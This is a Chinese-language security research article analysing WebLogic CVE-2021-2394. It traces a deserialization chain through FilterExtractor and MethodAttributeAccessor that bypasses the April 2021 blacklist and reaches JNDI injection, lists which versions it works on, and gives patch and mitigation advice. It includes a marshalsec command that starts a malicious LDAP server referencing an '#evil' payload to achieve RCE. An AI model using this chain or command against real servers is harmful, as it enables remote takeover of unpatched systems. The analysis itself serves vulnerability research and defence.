> 原文链接: https://www.anquanke.com//post/id/250468 


# Weblogic CVE-2021-2394 分析


                                阅读量   
                                **26839**
                            
                        |
                        
                                                                                    



[![](https://p1.ssl.qhimg.com/t01504c15f878c3ceb3.gif)](https://p1.ssl.qhimg.com/t01504c15f878c3ceb3.gif)



作者：白帽汇安全研究院@kejaly

校对：白帽汇安全研究院@r4v3zn

# <a class="reference-link" name="%E5%89%8D%E8%A8%80"></a>前言

在2021年7月21日，Oracle官方 发布了一系列安全更新。涉及旗下产品（Weblogic Server、Database Server、Java SE、MySQL等）的 342 个漏洞，[https://www.oracle.com/security-alerts/cpujul2021.htm。其中，Oracle](https://www.oracle.com/security-alerts/cpujul2021.htm%E3%80%82%E5%85%B6%E4%B8%AD%EF%BC%8COracle) WebLogic Server 产品中有高危漏洞，漏洞编号为 CVE-2021-2594，CVSS 评分9.8分，影响多个 WebLogic 版本，且漏洞利用难度低，可基于 T3 和 IIOP 协议执行远程代码。

[![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p0.ssl.qhimg.com/t01885cbbd0a2191225.png)

经过分析，此次漏洞结合了 CVE-2020-14756 和 CVE-2020-14825 反序列化链，利用`FilterExtractor` 这个类来对4月份补丁进行绕过。

# <a class="reference-link" name="%E8%A1%A5%E4%B8%81%E5%9B%9E%E9%A1%BE"></a>补丁回顾

在4月份补丁中，对 `ExternalizableHelper` 中的 `readExternalizable` 做了修改，增加了对传入的 `DataInput` 判断，如果是 `ObjectInputStream` 类型就会调用 `checkObjectInputFilter` 函数进行过滤。所以再利用 CVE-2020-14756 中直接反序列化 `com.tangosol.coherence.rest.util.extractor.MvelExtractor` 来造成 RCE 的方法已经行不通了。

[![](https://p4.ssl.qhimg.com/t01efd0c47b3794735a.png)](https://p4.ssl.qhimg.com/t01efd0c47b3794735a.png)

# <a class="reference-link" name="%E8%B0%83%E8%AF%95%E7%8E%AF%E5%A2%83"></a>调试环境

**本文基于 win7 虚拟机 + Weblogic 12.1.4 版本 + jdk 8u181 进行研究分析测试**

修改目录 `user_project/domains/base_domain/bin` 目录中 `setDomainEnv.cmd` ，加`if %debugFlag == "true"%` 之前加入 `set debugFlag=true`。

[![](https://p3.ssl.qhimg.com/t0173bf57488f6fa1d1.png)](https://p3.ssl.qhimg.com/t0173bf57488f6fa1d1.png)

拷贝 `Oracle_Home` 目录下所有文件至调试目录，将 `\coherence\lib`，`\oracle_common\modules` 目录下所有文件添加到 Libraries：

[![](https://p0.ssl.qhimg.com/t01e191ee4dec927390.png)](https://p0.ssl.qhimg.com/t01e191ee4dec927390.png)

配置 idea 中 jdk 版本与虚拟机中运行的 weblogic jdk 版本保持一致。

添加 remote 调试：

[![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p3.ssl.qhimg.com/t013392bf09fb4515c0.png)

# <a class="reference-link" name="%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8"></a>漏洞利用

该漏洞主要是因为 `FilterExtractor` 的 `readExternal` 方法中会直接 `new` 一个 `MethodAttributeAccessor` 对象，使得生成 `MethodAttributeAccessor`的时候不会受到黑名单的限制，来对4月份的补丁进行绕过。

`FilterExtractor` 类具有如下特征：

1.`FilterExtractor` 实现了 `ExternalizableLite` 接口，重写了 `readExternal` 方法：

[![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p0.ssl.qhimg.com/t0114ab74d45e7b1926.png)

[![](https://p1.ssl.qhimg.com/t0144ce7455dc192d41.png)](https://p1.ssl.qhimg.com/t0144ce7455dc192d41.png)

`readExternal` 会调用`oracle.eclipselink.coherence.integrated.internal.cache.SerializationHelper#readAttributeAccessor` 方法:

[![](https://p4.ssl.qhimg.com/t0141296be35e040689.png)](https://p4.ssl.qhimg.com/t0141296be35e040689.png)

可以看到会 `new` 一个 `MethodAttributeAccessor` 对象，然后根据 `DataInput` 赋值它的 `setAttributeName`，`setGetMethodName` 以及 `setSetMethodName` 属性（这就导致这三个属性是可控的）。

2.`FilterExtractor` 的 `extract` 方法中存在 `this.attributeAccessor.getAttributeValueFromObject()` 的调用。

[![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p5.ssl.qhimg.com/t01d207b32d4b41a910.png)

熟悉 coherence 组件的漏洞的朋友应该知道在 CVE-2020-14825 中，就是利用 `MethodAttributeAccessor.getAttributeValueFromObject()` 来实现任意无参方法的调用的。

[![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p0.ssl.qhimg.com/t013e7bfc999c23e253.png)

虽然 `MethodAttributeAccessor` 已经加入到了黑名单，但是在上面提到的 `readExternal` 方法中恰好直接 `new` 了一个 `MethodAttributeAccessor` 对象，也就是说不是通过反序列化得到 `MethodAttributeAccessor` 对象，自然也就不受黑名单的影响。

## 调用链

完整调用链如下：

[![](https://p0.ssl.qhimg.com/t014c43056a08db50fd.png)](https://p0.ssl.qhimg.com/t014c43056a08db50fd.png)

[![](https://p2.ssl.qhimg.com/t01b339fa65bda49e7d.png)](https://p2.ssl.qhimg.com/t01b339fa65bda49e7d.png)

## 漏洞分析

根据构造的 poc ，我们首先在 `AttributeHolder` 类的 `readExternal`方法中打上断点，另一边则运行我们的 poc ，成功断下：

[![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p2.ssl.qhimg.com/t013b5d216277aa53c6.png)

步入，会调用到 `com.tangosol.util.ExternalizableHelper` 中的 `readObject` 方法：

[![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p1.ssl.qhimg.com/t01df5b8ff55004d235.png)

步入，最后会进入到 `com.tangosol.util.ExternalizableHelper`中的 `readObjectInternal` 方法中调用 `readExternalizableLite` 方法：

[![](https://p1.ssl.qhimg.com/t0174ff1c690794cf3f.png)](https://p1.ssl.qhimg.com/t0174ff1c690794cf3f.png)

[![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p2.ssl.qhimg.com/t01232199bd59eb42a9.png)

步入，在`com.tangosol.util.ExternalizableHelper#readExternalizableLite` 方法中，首先会调用 `loadClass` 去加载类，然后调用无参构造函数实例化一个对象，这里个加载的类是 `com.tangosol.util.aggregator.TopNAggregator$PartialResult`：

[![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p4.ssl.qhimg.com/t014e2d16172f1f2f2d.png)

[![](https://p4.ssl.qhimg.com/t01074ce10544690c2d.png)](https://p4.ssl.qhimg.com/t01074ce10544690c2d.png)

随后会调用 `com.tangosol.util.aggregator.TopNAggregator$PartialResult` 类的 readExternal 方法：

[![](https://p1.ssl.qhimg.com/t01ca568e63c86c1bf0.png)](https://p1.ssl.qhimg.com/t01ca568e63c86c1bf0.png)

步入，会再次调用 `com.tangosol.util.ExternalizableHelper.readObject` 方法来读取一个对象并且赋值到 `this.m_comparator` 中，

[![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p1.ssl.qhimg.com/t01e96b837cb8a0a054.png)

步入，之后会再次调用到 `com.tangosol.util.ExternalizableHelper#readExternalizableLite` 方法，由于这次读取的 `sClass` 是 `oracle.eclipselink.coherence.integrated.internal.querying.FilterExtractor` ，所以会实例化一个 `FilterExtractor` 对象，然后调用它的 `readExternal` 方法：

[![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p1.ssl.qhimg.com/t01103022ef47389916.png)

[![](https://p4.ssl.qhimg.com/t014c4731a91183de4a.png)](https://p4.ssl.qhimg.com/t014c4731a91183de4a.png)

步入 ，来到 `FilterExtractor` 的 `readExteral` 中，会调用 `oracle.eclipselink.coherence.integrated.internal.cache.SerializationHelper#readAttributeAccessor` 方法：

[![](https://p3.ssl.qhimg.com/t010619c4b31e169670.png)](https://p3.ssl.qhimg.com/t010619c4b31e169670.png)

步入，会 `new` 一个 `MethodAttributeAccessor` 对象，并且调用 `com.tangosol.util.SerializationHelper#readObject` 方法给 `MethodAttributeAccessor` 对象的 `attributeName` , `getMethodName` 和 `setMethodName` 这三个属性赋值：

[![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p5.ssl.qhimg.com/t0187538f56d4497b36.png)

赋值之后的结果为：

[![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p3.ssl.qhimg.com/t01bec94920e9debc9a.png)

再回到之前的 `com.tangosol.util.aggregator.TopNAggregator$PartialResult` 类的 readExternal 方法中，`this.m_comparator` 变成了上面 `oracle.eclipselink.coherence.integrated.internal.querying.FilterExtractor` 对象：

[![](https://p0.ssl.qhimg.com/t0179798bb84b415fd0.png)](https://p0.ssl.qhimg.com/t0179798bb84b415fd0.png)

[![](https://p0.ssl.qhimg.com/t016a46fcfd5275dbac.png)](https://p0.ssl.qhimg.com/t016a46fcfd5275dbac.png)

接着在 182 行，会调用 `this.instantiateInternalMap(this.m_comparator)` 方法，步入，会把 `FilterExtractor`再封装到 `WrapperCompator` 中，然后传入 `TreeMap`的构造函数，实例化一个 `TreeMap` 对象并且返回：

[![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p2.ssl.qhimg.com/t0137ba1eeba0c06174.png)

[![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p3.ssl.qhimg.com/t010b900359121d6285.png)

186 行，调用 `this.add` 方法，这里 `ExternalizableHelper.readObject(in)`返回的是 `JdbcRowSetImpl` 对象

[![](https://p4.ssl.qhimg.com/t014ac22aa4b6c20ffa.png)](https://p4.ssl.qhimg.com/t014ac22aa4b6c20ffa.png)

[![](https://p5.ssl.qhimg.com/t01ef5790ac1e9e3d01.png)](https://p5.ssl.qhimg.com/t01ef5790ac1e9e3d01.png)

[![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p0.ssl.qhimg.com/t018f5c5357acf5d07a.png)

接着步入 `super.add` 方法：

[![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p0.ssl.qhimg.com/t013a245b941ca50e65.png)

然后会调用 `TreeMap.put` 方法，添加传入的 `JdbcRowSetImpl` 对象，最后会来到 `com.tangosol.util.WrapperComparator#compare` 方法并触发 `this.f_comparator.compare` 方法， `this.f_comparator` 正是之前传入的 `FilterExtractor` 对象：

[![](https://p0.ssl.qhimg.com/t0147939a3360204b80.png)](https://p0.ssl.qhimg.com/t0147939a3360204b80.png)

[![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p1.ssl.qhimg.com/t01f22db1d23901dce5.png)

步入，会调用 `com.tangosol.util.extractor#compare` 方法，这个方法中又会调用到 `this.extract` 方法，也就是会调用 `FilterExtractor#extract`方法，进而调用 `this.attributeAccessor` 的 `initializeAttributes` 方法, 而此时的 `this.attributeAccssor` 是 `MethodAttributeAccessor` 对象，所以会调用 `MethodAttributeAccessor#initializeAttributes` 方法：

[![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p5.ssl.qhimg.com/t0136fe82b38f923d02.png)

[![](https://p0.ssl.qhimg.com/t016af9f45b574935d9.png)](https://p0.ssl.qhimg.com/t016af9f45b574935d9.png)

在 `MethodAttributeAccessor` 中的 `initializeAttributes` 方法中首先会调用 `this.setGetMethod` 方法来设置 `MethodAttributeAccessor` 的 `getMethod` ：

[![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p2.ssl.qhimg.com/t01c05a4fff1d188c1c.png)

其中 `Helper.getDeclaredMethod` 方法流程如下，是通过传入的类，方法名，以及参数类型来得到对应 `class` 的 `Method`：

[![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p1.ssl.qhimg.com/t01f8bec670ae065b73.png)

[![](https://p5.ssl.qhimg.com/t0178800551e6040733.png)](https://p5.ssl.qhimg.com/t0178800551e6040733.png)

[![](https://p2.ssl.qhimg.com/t01cd3a1f7c156b38a4.png)](https://p2.ssl.qhimg.com/t01cd3a1f7c156b38a4.png)

此时由于 `theJavaClass` 是 `com.sun.rowset.JdbcRowSetImpl`, `this.getMethodName` 是 `"prepare"` ，所以第一次得到的 `prepare` 方法：

[![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p1.ssl.qhimg.com/t01bb6f707aa6f9507c.png)

[![](https://p4.ssl.qhimg.com/t01d51aacac4bbbe194.png)](https://p4.ssl.qhimg.com/t01d51aacac4bbbe194.png)

[![](https://p1.ssl.qhimg.com/t018cd583c569ec84dd.png)](https://p1.ssl.qhimg.com/t018cd583c569ec84dd.png)

与 CVE-2020-14825 的反序列化流程不同的是， 因为在 `initializeAttributes` 的时候，我们不能再通过控制 `isWriteOnly` 属性为 `true` ，所以会进入到下面这个 if 分支里面去：

[![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p3.ssl.qhimg.com/t0114cf23b91df0e36f.png)

会先调用 `this.getSetMethodParameterTypes` 得到 `this.getGetMethod` 属性代表的方法的返回值：

[![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p1.ssl.qhimg.com/t011aeb69298ca80aa3.png)

[![](https://p5.ssl.qhimg.com/t018d64416df62e4056.png)](https://p5.ssl.qhimg.com/t018d64416df62e4056.png)

`this.getGetMethod` 在上一步赋值为了 `protected java.sql.PreparedStatement com.sun.rowset.JdbcRowSetImpl.prepare() throws java.sql.SQLException` ，

[![](https://p1.ssl.qhimg.com/t01925692ce71e4b6e9.png)](https://p1.ssl.qhimg.com/t01925692ce71e4b6e9.png)

所以这里 `this.getSetMethodParameterTypes` 方法得到的是 `java.sql.PreparedStatement`类型:

[![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p1.ssl.qhimg.com/t01fb7aefe5f1ee806e.png)

然后调用`Helper.getDeclaredMethod(theJavaClass, this.getSetMethodName(), this.getSetMethodParameterTypes());` 就会得到 `protected java.sql.PreparedStatement com.sun.rowset.JdbcRowSetImpl.prepare() throws java.sql.SQLException` 方法。

`initializeAttributes` 结束后 `MethodAttributeAccessor`的属性值：

[![](https://p3.ssl.qhimg.com/t01580aae8da4dfce34.png)](https://p3.ssl.qhimg.com/t01580aae8da4dfce34.png)

接着，回到 `FilterExtractor#extract` 方法中，会继续调用 `this.attributeAccessor.getAttributeValueFromObject` 也就是调用 `MethodAttributeAccessor.getAttributeValueFromObject` 方法：

[![](https://p2.ssl.qhimg.com/t01fff4b681b5f14e80.png)](https://p2.ssl.qhimg.com/t01fff4b681b5f14e80.png)

步入：

[![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p0.ssl.qhimg.com/t01a16a36827ee1bf74.png)

步入，会利用反射调用方法：

[![](https://p3.ssl.qhimg.com/t01aa10a2912df25d52.png)](https://p3.ssl.qhimg.com/t01aa10a2912df25d52.png)

此时 `this.getMethod` 是 `protected java.sql.PreparedStatement com.sun.rowset.JdbcRowSetImpl.prepare() throws java.sql.SQLException`，`abObject` 是 `JbbcRoeSetImpl` ：

[![](https://p4.ssl.qhimg.com/t01ce92d8788781b8ed.png)](https://p4.ssl.qhimg.com/t01ce92d8788781b8ed.png)

这就导致了 jndi 注入的产生：

[![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p5.ssl.qhimg.com/t01517ee7f45d8199b0.png)

[![](https://p1.ssl.qhimg.com/t0151286013dbb939b0.png)](https://p1.ssl.qhimg.com/t0151286013dbb939b0.png)

[![](https://p4.ssl.qhimg.com/t01f31f7a1168ce657d.png)](https://p4.ssl.qhimg.com/t01f31f7a1168ce657d.png)

我们在本地使用 marshalsec 搭建恶意 jndi 服务端：

```
java -cp marshalsec-0.0.3-SNAPSHOT-all.jar marshalsec.jndi.LDAPRefServer http://192.168.1.1:8000/#evil 1389
python -m http.server
```

成功 RCE：

[![](https://p1.ssl.qhimg.com/t01dc480552ed03e4e3.png)](https://p1.ssl.qhimg.com/t01dc480552ed03e4e3.png)

## jndi 版本问题

在Oracle JDK 11.0.1、8u191、7u201、6u211之后 com.sun.jndi.ldap.object.trustURLCodebase 属性的默认值被设置为false，所以此 ldap + jndi 导致 RCE 的方法失效。

## &lt;a name=”10.3.6.0 问题” class=”reference-link”&gt;10.3.6.0 问题

在使用基于 `TopNAggregator.PartialResult` 的 poc 对官网说的版本进行复现的时候，发现 10.3.6.0.0 版本中并不存在 `com.tangosol.util.SortedBag` 和 `com.tangosol.util.aggregator.TopNAggregator` 这两个类：

[![](https://p2.ssl.qhimg.com/t01426ea04d08d3a391.png)](https://p2.ssl.qhimg.com/t01426ea04d08d3a391.png)

缺少 `SortedBag`：

[![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p4.ssl.qhimg.com/t015341f2a05449288f.png)

缺少 `TopNAggregator` ：

[![](https://p3.ssl.qhimg.com/t012dd12b5cd58d2554.png)](https://p3.ssl.qhimg.com/t012dd12b5cd58d2554.png)

## weblogic 版本问题

使用不同 weblogic 版本的 jar 包对不同版本的 weblogic 进行测试，经过测试研究发现以下情况：

<th style="text-align: center;">jar 版本</th><th style="text-align: center;">weblogic 版本</th><th style="text-align: center;">成功情况</th>
|------
<td style="text-align: center;">12.1.3.0.0</td><td style="text-align: center;">12.1.3.0.0</td><td style="text-align: center;">成功</td>
<td style="text-align: center;">12.1.3.0.0</td><td style="text-align: center;">12.2.1.3.0</td><td style="text-align: center;">失败</td>
<td style="text-align: center;">12.1.3.0.0</td><td style="text-align: center;">12.2.1.4.0</td><td style="text-align: center;">失败</td>
<td style="text-align: center;">12.1.3.0.0</td><td style="text-align: center;">14.1.1.0.0</td><td style="text-align: center;">失败</td>
<td style="text-align: center;">12.2.1.3.0</td><td style="text-align: center;">12.1.3.0.0</td><td style="text-align: center;">失败</td>
<td style="text-align: center;">12.2.1.3.0</td><td style="text-align: center;">12.2.1.3.0</td><td style="text-align: center;">成功</td>
<td style="text-align: center;">12.2.1.3.0</td><td style="text-align: center;">12.2.1.4.0</td><td style="text-align: center;">成功</td>
<td style="text-align: center;">12.2.1.3.0</td><td style="text-align: center;">14.1.1.0.0</td><td style="text-align: center;">成功</td>
<td style="text-align: center;">12.2.1.4.0</td><td style="text-align: center;">12.1.3.0.0</td><td style="text-align: center;">失败</td>
<td style="text-align: center;">12.2.1.4.0</td><td style="text-align: center;">12.2.1.3.0</td><td style="text-align: center;">成功</td>
<td style="text-align: center;">12.2.1.4.0</td><td style="text-align: center;">12.2.1.4.0</td><td style="text-align: center;">成功</td>
<td style="text-align: center;">12.2.1.4.0</td><td style="text-align: center;">14.1.1.0.0</td><td style="text-align: center;">成功</td>
<td style="text-align: center;">14.1.1.0.0</td><td style="text-align: center;">12.1.3.0.0</td><td style="text-align: center;">失败</td>
<td style="text-align: center;">14.1.1.0.0</td><td style="text-align: center;">12.2.1.3.0</td><td style="text-align: center;">成功</td>
<td style="text-align: center;">14.1.1.0.0</td><td style="text-align: center;">12.2.1.4.0</td><td style="text-align: center;">成功</td>
<td style="text-align: center;">14.1.1.0.0</td><td style="text-align: center;">14.1.1.0.0</td><td style="text-align: center;">成功</td>

# <a class="reference-link" name="7%E6%9C%88%E4%BB%BD%E8%A1%A5%E4%B8%81%E5%BD%B1%E5%93%8D"></a>7月份补丁影响

打了7月份补丁之后，会报错：

[![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p5.ssl.qhimg.com/t01d6cf4f6a06fde263.png)

原因是在 `WebLogicFilterConfig` 类的`DEFAULT_BLACKLIST_PACKAGES` 字段中新增了 `oracle.eclipselink.coherence.integrated.internal.querying` 这个包：

[![](https://p1.ssl.qhimg.com/t0115b406af175c6fca.png)](https://p1.ssl.qhimg.com/t0115b406af175c6fca.png)

而 `FilterExtractor` 类正好在 `oracle.eclipselink.coherence.integrated.internal.querying` 包下面，所以导致被黑名单拦截了下来。

# <a class="reference-link" name="%E4%BF%AE%E5%A4%8D%E5%BB%BA%E8%AE%AE"></a>修复建议

## 通用修补建议

Oracle官方已经发布补丁，及时进行更新：[https://www.oracle.com/security-alerts/cpujul2021.html](https://www.oracle.com/security-alerts/cpujul2021.html)

## Weblogic 临时修补建议
1. 如果不依赖 T3协议进行 JVM通信，可禁用 T3协议。
1. 如果不依赖 IIOP协议进行 JVM通信，可禁用 IIOP协议。
# <a class="reference-link" name="%E5%8F%82%E8%80%83"></a>参考

[https://www.cnblogs.com/potatsoSec/p/15062094.html](https://www.cnblogs.com/potatsoSec/p/15062094.html)

[https://mp.weixin.qq.com/s/LbMB-2Qyrh3Lrqc_vsKIdA](https://mp.weixin.qq.com/s/LbMB-2Qyrh3Lrqc_vsKIdA)
